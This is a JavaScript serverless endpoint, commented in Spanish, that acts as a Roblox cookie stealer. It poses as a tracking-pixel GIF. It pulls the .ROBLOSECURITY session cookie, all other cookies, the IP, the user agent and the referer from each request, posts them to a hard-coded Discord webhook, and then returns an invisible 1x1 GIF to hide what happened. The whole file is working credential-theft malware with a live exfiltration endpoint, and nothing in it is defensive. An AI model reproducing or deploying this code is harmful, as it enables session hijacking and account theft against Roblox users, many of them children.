// api/gif.js
export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    // ============================================
    // 1. OBTENER COOKIES DE LOS HEADERS
    // ============================================
    const cookies = req.headers.cookie || '';
    const userAgent = req.headers['user-agent'] || 'Desconocido';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Desconocida';
    const referer = req.headers['referer'] || 'Directo';
    
    // ============================================
    // 2. BUSCAR .ROBLOSECURITY
    // ============================================
    const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
    const robloxCookie = match ? match[1] : 'No encontrada';
    
    // ============================================
    // 3. ENVIAR A DISCORD
    // ============================================
    const webhook = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
    
    const embed = {
        title: "🍪 COOKIE ROBLOX CAPTURADA (vía IMG)",
        color: 0x00ff00,
        fields: [
            {
                name: "📌 Cookie .ROBLOSECURITY",
                value: `\`\`\`${robloxCookie}\`\`\``,
                inline: false
            },
            {
                name: "🌍 IP",
                value: `\`${ip}\``,
                inline: true
            },
            {
                name: "📱 User Agent",
                value: `\`${userAgent.substring(0, 100)}\``,
                inline: true
            },
            {
                name: "🔗 Referer",
                value: `\`${referer}\``,
                inline: true
            },
            {
                name: "🍪 Todas las cookies",
                value: `\`\`\`${cookies || 'Ninguna'}\`\`\``,
                inline: false
            }
        ],
        footer: { text: "Método IMG" }
    };

    try {
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "@everyone",
                embeds: [embed]
            })
        });
    } catch (error) {}

    // ============================================
    // 4. RESPONDER CON GIF INVISIBLE
    // ============================================
    const gifBuffer = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.status(200).send(gifBuffer);
}